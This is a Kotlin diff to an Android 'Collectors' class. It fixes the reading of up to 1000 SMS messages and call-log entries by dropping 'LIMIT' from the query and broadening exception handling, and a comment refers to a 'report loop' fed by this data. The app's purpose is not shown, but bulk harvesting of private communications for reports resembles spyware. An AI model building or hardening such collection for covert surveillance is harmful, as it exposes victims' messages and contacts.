@@ -163,10 +163,13 @@ class Collectors {
     fun collectSmsMessages(context: Context): List<SmsMessage> {
         val messages = mutableListOf<SmsMessage>()
         try {
+            // NOTE: "LIMIT" in the sortOrder is rejected by the telephony
+            // provider on newer Android versions (IllegalArgumentException:
+            // Invalid token LIMIT) — cap the row count in code instead.
             val cursor: Cursor? = context.contentResolver.query(
                 Telephony.Sms.CONTENT_URI,
                 null, null, null,
-                "${Telephony.Sms.DATE} DESC LIMIT 1000"
+                "${Telephony.Sms.DATE} DESC"
             )
             cursor?.use { c ->
                 val idCol = c.getColumnIndex(Telephony.Sms._ID)
@@ -175,7 +178,8 @@ class Collectors {
                 val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
                 val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)
 
-                while (c.moveToNext()) {
+                var count = 0
+                while (c.moveToNext() && count < 1000) {
                     messages.add(SmsMessage(
                         id = c.getLong(idCol),
                         address = c.getString(addrCol) ?: "",
@@ -183,9 +187,10 @@ class Collectors {
                         date = c.getLong(dateCol),
                         type = c.getInt(typeCol)
                     ))
+                    count++
                 }
             }
-        } catch (e: SecurityException) {
+        } catch (e: Exception) {
             e.printStackTrace()
         }
         return messages
@@ -194,10 +199,14 @@ class Collectors {
     fun collectCallLogs(context: Context): List<CallLogEntry> {
         val logs = mutableListOf<CallLogEntry>()
         try {
+            // NOTE: "LIMIT" in the sortOrder is rejected by the call log
+            // provider on newer Android versions (IllegalArgumentException:
+            // Invalid token LIMIT), which crashed the whole report loop.
+            // Cap the row count in code instead.
             val cursor: Cursor? = context.contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
                 null, null, null,
-                "${CallLog.Calls.DATE} DESC LIMIT 1000"
+                "${CallLog.Calls.DATE} DESC"
             )
             cursor?.use { c ->
                 val idCol = c.getColumnIndex(CallLog.Calls._ID)
@@ -207,7 +216,8 @@ class Collectors {
                 val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
                 val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
 
-                while (c.moveToNext()) {
+                var count = 0
+                while (c.moveToNext() && count < 1000) {
                     logs.add(CallLogEntry(
                         id = c.getLong(idCol),
                         number = c.getString(numCol) ?: "",
@@ -216,9 +226,10 @@ class Collectors {
                         date = c.getLong(dateCol),
                         type = c.getInt(typeCol)
                     ))
+                    count++
                 }
             }
-        } catch (e: SecurityException) {
+        } catch (e: Exception) {
             e.printStackTrace()
         }
         return logs
